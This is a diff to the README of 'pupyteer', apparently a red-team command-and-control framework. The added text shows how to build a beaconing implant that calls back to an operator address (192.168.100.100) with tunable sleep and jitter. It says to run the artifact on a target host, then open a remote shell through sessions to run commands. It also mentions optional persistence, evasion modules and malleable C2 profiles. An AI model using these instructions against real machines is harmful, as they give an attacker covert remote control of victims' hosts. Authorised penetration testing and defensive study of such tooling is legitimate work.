@@ -40,9 +40,28 @@ Either from the console:
 
 ```
 pupyteer > payloads build --name test-payload --platform linux --arch x64 \
-             --type executable --transport https --host 192.168.100.100 --port 443 \
-             --profile HTTPS-Standard
+             --type executable --transport tcp --host 192.168.100.100 --port 8443 \
+             --profile HTTPS-Standard --sleep 30 --jitter 25
 ```
+
+`--sleep` / `--jitter` set the beacon interval compiled into the payload.
+`--persistence` is **off by default**: the agent only installs a registry /
+crontab entry when you ask for it explicitly.
+
+To use HTTP callbacks instead, enable the listener in the server config and
+build with `--transport http`:
+
+```yaml
+server:
+  host: "0.0.0.0"
+  port: 8443        # TCP callbacks
+  http_port: 8080   # HTTP callbacks; 0 disables them
+  http_uri: "/index.html"
+```
+
+For `--transport https`, either set `server.https_cert` / `server.https_key` so
+the listener terminates TLS, or front the HTTP listener with a reverse proxy
+holding a real certificate — agents verify server certificates.
 
 Or programmatically:
 
@@ -57,10 +76,12 @@ async def main():
     config = PayloadConfig(
         name="test-payload",
         payload_type=PayloadType.SCRIPT,
-        transport="https",
+        transport="tcp",
         host="192.168.100.100",
-        port=443,
+        port=8443,
         profile="HTTPS-Standard",
+        sleep=30,
+        jitter=25,
     )
     metadata = await engine.payloads.build(config)
     print(f"Artifact: {metadata.artifact_path} ({metadata.size_bytes} bytes)")
@@ -69,6 +90,21 @@ async def main():
 
 asyncio.run(main())
 ```
+
+### Work a Session
+
+Run the generated artifact on the target host; it registers over the listener
+and beacons. Then, from the console:
+
+```
+pupyteer > sessions list                       # callbacks
+pupyteer > sessions interact <session_id>      # shell: type 'sysinfo', 'ps', 'id -u'
+pupyteer > sessions results <session_id>       # output of commands already reported
+```
+
+Commands are queued per session and delivered on the agent's next check-in, so
+output appears after up to one beacon interval. Inside `sessions interact` the
+shell waits and prints the reply; outside it, `sessions results` catches up.
 
 ---
 
@@ -108,7 +144,7 @@ PUPYTEER
 | Category | Capabilities |
 |----------|-------------|
 | **Payloads** | Python script, PE executable, versioning, metadata tracking, signing stub |
-| **Transports** | HTTP, HTTPS (mTLS), DNS, DoH, DoT, TCP, WebSocket, NamedPipe |
+| **Transports** | Served listeners: **TCP** and **HTTP/HTTPS** (same session protocol, one JSON message per POST). Agent-side DNS/DoH/WebSocket stubs exist but have no listener, so `payloads build` rejects them rather than ship a payload that can never call back. |
 | **C2 Profiles** | YAML-based malleable C2 — heartbeat, encoding, timeouts, headers, URIs |
 | **Modules** | Core, Recon, Execution, File Ops, Red-Team, Evasion — standardized ABC |
 | **Sessions** | list/info/interact/rename/kill/tag/search, audit trail |
@@ -178,7 +214,7 @@ git-ignored.
 .venv/bin/python -m pytest pupyteer/tests/integration/ -v
 ```
 
-**Current test count: 733 tests passing** (`pytest pupyteer/tests`)
+**Current test count: 746 tests passing** (`pytest pupyteer/tests`)
 
 ---
 
